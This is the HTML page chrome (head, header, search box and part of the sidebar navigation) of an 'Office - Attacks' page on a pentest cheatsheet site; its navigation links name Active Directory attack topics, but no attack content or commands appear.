
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
      
      
      
        <link rel="canonical" href="https://hktalent.github.io/InternalAllTheThings/redteam/access/office-attacks/">
      
      
        <link rel="prev" href="../initial-access/">
      
      
        <link rel="next" href="../windows-download-execute/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>Office - Attacks - Internal All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Office - Attacks - Internal All The Things" >
      
        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  property="og:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/redteam/access/office-attacks.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://hktalent.github.io/InternalAllTheThings/redteam/access/office-attacks/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Office - Attacks - Internal All The Things" >
      
        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  name="twitter:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/redteam/access/office-attacks.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#office-attacks" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Internal All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Office - Attacks
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Internal All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal All The Things
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Active directory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Active directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adcs-certificate-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Certificate Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-acl-ace/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Access Controls ACL/ACE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-enumerate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-group-policy-objects/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Group Policy Objects
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-groups/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Groups
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-ntds-dumping/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - NTDS Dumping
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adds-rodc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Read Only Domain Controller
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-adfs-federation-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Federation Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-integrated-dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Integrated DNS - ADIDNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-asrep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - ASREP Roasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-kerberoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Kerberoasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-roasting-timeroasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Timeroasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/ad-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/deployment-sccm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - SCCM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/deployment-wsus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - WSUS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-capture/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Capture and Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-over-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - OverPass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/hash-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Pass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-dcom/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - DCOM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-mitm-relay/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - MITM and Relay
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-pxe-boot-image/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - PXE Boot Image
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/internal-shares/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - Shares
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-bronze-bit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Bronze Bit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-constrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Resource Based Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Unconstrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-s4u/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Service for User Extension
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/kerberos-tickets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Tickets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-comments/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - AD User Comment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-dsrm-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - DSRM Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-group-policy-preferences/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Group Policy Preferences
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-precreated-computer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Pre-Created Computer Account
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-read-gmsa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - GMSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-read-laps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - LAPS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-shadow-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Shadow Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/pwd-spraying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Spraying
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-pam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Privileged Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-relationship/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Relationship
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-sid-hijacking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Child Domain to Forest Compromise - SID Hijacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/trust-ticket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forest to Forest Compromise - Trust Ticket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_42" >
        
          
          <label class="md-nav__link" for="__nav_2_42" id="__nav_2_42_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CVE
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_42_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_42">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/MS14-068/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MS14-068 Checksum Validation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/NoPAC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NoPAC / samAccountName Spoofing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/PrintNightmare/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrintNightmare
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/PrivExchange/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrivExchange
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../active-directory/CVE/ZeroLogon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ZeroLogon
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cheatsheets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/escape-breakout/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Application Escape and Breakout
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/hash-cracking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/mimikatz-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mimikatz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/miscellaneous-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Miscellaneous & Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/mssql-server-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MSSQL Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/network-discovery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Discovery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/powershell-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Powershell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
